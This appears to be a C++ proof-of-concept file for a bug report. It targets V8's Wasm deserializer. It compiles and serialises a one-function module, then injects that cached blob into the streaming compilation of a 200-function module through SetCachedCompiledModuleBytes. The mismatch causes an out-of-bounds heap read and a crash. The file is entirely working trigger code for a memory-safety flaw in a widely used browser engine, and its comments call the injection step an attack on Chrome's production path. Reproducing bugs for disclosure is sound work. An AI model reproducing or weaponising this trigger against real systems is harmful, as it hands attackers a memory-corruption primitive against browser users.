// NativeModuleDeserializer::ReadCode OOB PoC via V8 public C++ API
// Uses WasmModuleCompilation::SetCachedCompiledModuleBytes — Chrome production path
// NO d8 hash guard. Demonstrates the same code path as AsyncStreamingProcessor::Deserialize.
//
// Build: ninja -C out/x64.release poc_wasm_oob
// Run:   ./out/x64.release/poc_wasm_oob
// Expected: SIGSEGV in NativeModuleDeserializer::TranslateEffectHandlersToCanonical

#include <cstdint>
#include <cstdio>
#include <functional>
#include <memory>
#include <span>
#include <variant>
#include <vector>

#include "include/libplatform/libplatform.h"
#include "include/v8-context.h"
#include "include/v8-initialization.h"
#include "include/v8-isolate.h"
#include "include/v8-local-handle.h"
#include "include/v8-wasm.h"

// 1-fn Wasm module: () -> i32, returns 42
static const uint8_t kWire1fn[] = {
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
    0x03, 0x02, 0x01, 0x00,
    0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
    0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b
};

// Build 200-fn module with same type signature
static std::vector<uint8_t> BuildWire200() {
    auto leb = [](uint32_t n, std::vector<uint8_t>& out) {
        do { uint8_t b = n & 0x7f; n >>= 7; out.push_back(n ? (b | 0x80) : b); } while (n);
    };
    const uint32_t N = 200;
    std::vector<uint8_t> r;
    // magic + version
    for (uint8_t b : {0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00}) r.push_back(b);
    // type section: () -> i32
    for (uint8_t b : {0x01,0x05,0x01,0x60,0x00,0x01,0x7f}) r.push_back(b);
    // function section: N functions, type 0
    std::vector<uint8_t> fp; leb(N, fp); for (uint32_t i=0;i<N;i++) fp.push_back(0);
    r.push_back(0x03); leb(fp.size(), r); r.insert(r.end(), fp.begin(), fp.end());
    // code section: N bodies each = {4 bytes: local_count=0, i32.const 0, end}
    uint8_t body[] = {0x04,0x00,0x41,0x00,0x0b};
    std::vector<uint8_t> cp; leb(N, cp);
    for (uint32_t i=0;i<N;i++) cp.insert(cp.end(), body, body+5);
    r.push_back(0x0a); leb(cp.size(), r); r.insert(r.end(), cp.begin(), cp.end());
    return r;
}

int main(int argc, char* argv[]) {
    v8::V8::InitializeICUDefaultLocation(argv[0]);
    v8::V8::InitializeExternalStartupData(argv[0]);
    auto platform = v8::platform::NewDefaultPlatform();
    v8::V8::InitializePlatform(platform.get());
    v8::V8::Initialize();

    v8::Isolate::CreateParams cp;
    cp.array_buffer_allocator = v8::ArrayBuffer::Allocator::NewDefaultAllocator();
    auto* isolate = v8::Isolate::New(cp);

    {
        v8::Isolate::Scope is(isolate);
        v8::HandleScope hs(isolate);
        auto ctx = v8::Context::New(isolate);
        v8::Context::Scope cs(ctx);

        auto wire200 = BuildWire200();
        fprintf(stderr, "[*] wire1fn: %zu B  wire200: %zu B\n",
                sizeof(kWire1fn), wire200.size());

        // Compile 1-fn module and serialize it
        auto mod = v8::WasmModuleObject::Compile(
            isolate, {kWire1fn, sizeof(kWire1fn)}).ToLocalChecked();
        auto blob = mod->GetCompiledModule().Serialize();
        std::vector<uint8_t> blob_data(blob.as_span().begin(), blob.as_span().end());
        fprintf(stderr, "[*] blob_1fn: %zu B\n", blob_data.size());

        // Attack: stream 200-fn wire bytes, inject 1-fn compiled blob
        // This is the Chrome production path (streaming-decoder.cc:434-436):
        //   processor->Deserialize(blob_1fn, wire200) — NO hash guard
        fprintf(stderr, "[*] Injecting blob_1fn into 200-fn stream (Chrome code path)...\n");
        fprintf(stderr, "[*] ReadCode loops 200x on a 1-fn blob → OOB heap read\n");
        fprintf(stderr, "[*] Expect: SIGSEGV in TranslateEffectHandlersToCanonical\n");

        v8::WasmModuleCompilation compilation;
        compilation.SetHasCompiledModuleBytes();
        compilation.OnBytesReceived(wire200.data(), wire200.size());
        compilation.Finish(
            isolate,
            [&blob_data](v8::WasmStreaming::ModuleCachingInterface& iface) {
                auto wb = iface.GetWireBytes();
                fprintf(stderr, "[*] caching_callback: wire=%zu B, injecting blob_1fn=%zu B\n",
                        wb.size(), blob_data.size());
                // This calls DeserializeNativeModule(blob_1fn, wire200) in V8 core
                iface.SetCachedCompiledModuleBytes({blob_data.data(), blob_data.size()});
                // Should not reach here — SIGSEGV expected above
                fprintf(stderr, "[!] Returned from SetCachedCompiledModuleBytes (no crash?)\n");
            },
            [](std::variant<v8::Local<v8::WasmModuleObject>,
                            v8::Local<v8::Value>>) {
                fprintf(stderr, "[!] Resolution callback (crash did not happen)\n");
            }
        );
    }

    isolate->Dispose();
    v8::V8::Dispose();
    v8::V8::DisposePlatform();
    delete cp.array_buffer_allocator;
    return 0;
}
